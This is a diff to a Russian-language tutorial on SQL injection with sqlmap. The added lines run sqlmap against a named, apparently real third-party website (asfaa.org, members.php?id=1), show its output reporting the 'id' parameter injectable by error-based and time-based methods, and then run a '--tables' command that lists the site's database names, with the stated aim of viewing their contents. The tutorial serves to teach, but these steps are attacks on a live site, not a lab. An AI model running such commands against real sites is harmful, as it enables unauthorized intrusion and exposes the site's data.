@@ -3,7 +3,7 @@
 
 Идея которая пришла мне в голову,<<А почему бы не рассказать об уязвимостях SQL?>>.Поэтому я буду рассказывать о разных уязвимостях SQLInject и также демонстрировать их.Некоторая информация была взята из открытых источников,поэтому некоторые цитаты или словосочитания могу совпадать с некоторыми статьями или с wikipedia.
 
-В папке exaple,будут лежать примеры скриптом связанные с SQL уязвимостями,если кому интересно можете их разобрать а также добавить свои <<Все комментария и замечание я буду чиать>>
+В папке exaple,будут лежать примеры скриптом связанные с SQL уязвимостями,если кому интересно можете их разобрать а также добавить свои <<Все комментария и замечание я буду читать>>
 
 P.S Спасибо за понимание :>
 
@@ -72,7 +72,8 @@ http://www.asfaa.org/members.php?id=1
 
 ```sh
 -u URL,                 Целевой хост
--A --random-agent,      Использование значение заголовка User-Agent   
+-A --random-agent,      Использование значение заголовка User-Agent 
+--tables,               Построить список таблиц
 ```
 
 
@@ -92,3 +93,50 @@ sqlmap -u http://www.asfaa.org/members.php?id=1 --random-agent
 ```
 
 Вышеупомянутая первая и самая простая команда.Она проверяет входные параметры,чтобы определить,уязвимо ли она на внедрение sql или нет.Для этого sqlmap отправляет полезные-sql-нагрузки во входные параметры и проверяя выходные данные.
+
+2.  Как мы видим sqlmap нашёл уязвимостей.
+
+```sh
+[INFO] testing 'Generic inline queries'
+[INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[[INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[INFO] GET parameter 'id' is 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)' injectable 
+[INFO] testing 'MySQL inline queries'
+[INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[WARNING] time-based comparison requires larger statistical model, please wait.. (done)                                                                                                               
+[INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
+[INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+[INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
+```
+
+Второй командой мы будем искать таблицы базы,чтобы в дальнейшем смотреть их содержимое))
+
+Запуск команды:
+
+```sh
+sqlmap -u http://www.asfaa.org/members.php?id=1 --tables  
+```
+Видим что есть несколько баз с данными
+
+```sh
+[INFO] fetching tables for databases: 'db83231_acolop, db83231_asfaa, information_schema'
+```
